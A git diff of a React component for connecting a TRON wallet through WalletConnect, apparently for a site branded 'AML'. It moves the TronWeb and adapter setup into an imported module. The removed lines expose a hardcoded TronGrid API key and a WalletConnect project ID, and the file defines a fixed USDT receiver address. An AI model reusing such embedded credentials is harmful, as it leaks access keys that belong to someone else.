@@ -1,36 +1,10 @@
-import React, { useState } from 'react';
-import { adapter, tronWeb, USDT_CONTRACT, TRON_RECEIVER } from './tronWallet';
+// src/components/tronAuthButton/TronAuthButton.tsx
 
+import React, { useState } from 'react';
+import { tronWeb, adapter } from './tronWallet';
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
-
-const tronWeb = new TronWeb({
-  fullHost: 'https://api.trongrid.io',
-  headers: {
-    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
-  },
-});
-
-const adapter = new WalletConnectAdapter({
-  network: 'Mainnet',
-  options: {
-    relayUrl: 'wss://relay.walletconnect.com',
-    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
-    metadata: {
-      name: 'AML',
-      description: 'TRON + WalletConnect Integration',
-      url: 'https://amlreports.pro',
-      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
-    },
-  },
-  web3ModalConfig: {
-    themeMode: 'dark',
-    explorerRecommendedWalletIds: [
-      // твои WalletConnect ID
-    ],
-  },
-});
 
 export const TronAuthButton: React.FC = () => {
   const [modalMessage, setModalMessage] = useState<string | null>("");
